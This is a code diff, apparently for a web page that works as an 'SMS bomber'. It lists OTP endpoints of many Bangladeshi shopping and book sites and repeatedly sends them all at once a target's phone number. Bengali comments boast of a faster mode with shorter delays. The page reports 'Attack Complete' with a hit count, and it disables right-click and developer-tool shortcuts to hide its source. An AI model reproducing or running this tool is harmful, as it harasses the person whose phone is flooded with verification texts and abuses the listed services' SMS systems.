@@ -199,4 +199,83 @@
         { url: `https://api.ryanscomputers.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.techlandbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
         { url: `https://api.skder.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.del
+        { url: `https://api.deligram.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.oasbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.bagdoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.rokomari.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.boibazar.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.eorange.shop/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.dhamakashopping.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.aleshamart.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.qcoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.boishakhi.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.need.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } }
+      ];
+
+      let successCount = 0;
+      for (let i = 0; i < amount; i++) {
+        timerDisplay.innerText = `Time Left: ${amount - i}s`;
+        
+        // Fast Mode: Promise.all দিয়ে সব API একসাথে রিকোয়েস্ট পাঠাবে
+        await Promise.all(apis.map(api => sendRequest(api.url, api.method, api.data).then(res => {
+          if (res) successCount++;
+        })));
+
+        let progress = ((i + 1) / amount) * 100;
+        progressBar.style.width = progress + '%';
+        await delay(300); // ডিলে কমিয়ে আরও ফাস্ট করা হয়েছে
+      }
+
+      // ১ নম্বর জায়গা একদম ক্লিয়ার করা
+      timerDisplay.innerText = ""; 
+
+      if (successCount > 0) {
+        responseMessage.innerHTML = `<span class="alert success">Attack Complete! (${successCount} Hits)</span>`;
+        if (typeof sound !== 'undefined') sound.play();
+      } else {
+        responseMessage.innerHTML = `<span class="alert failure">Attack Failed!</span>`;
+      }
+    }
+
+    // Matrix Rain Animation
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    const letters = "01010101PHANTOMVOID";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array.from({ length: columns }).fill(1);
+
+    function draw() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = "#0F0";
+      ctx.font = fontSize + "px monospace";
+      for (let i = 0; i < drops.length; i++) {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+    }
+    setInterval(draw, 35);
+
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+
+    // Security Features
+    (function () {
+      document.addEventListener("contextmenu", e => e.preventDefault());
+      document.addEventListener("keydown", e => {
+        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["I", "C", "J"].includes(e.key)) || (e.ctrlKey && e.key === "U")) {
+          e.preventDefault();
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
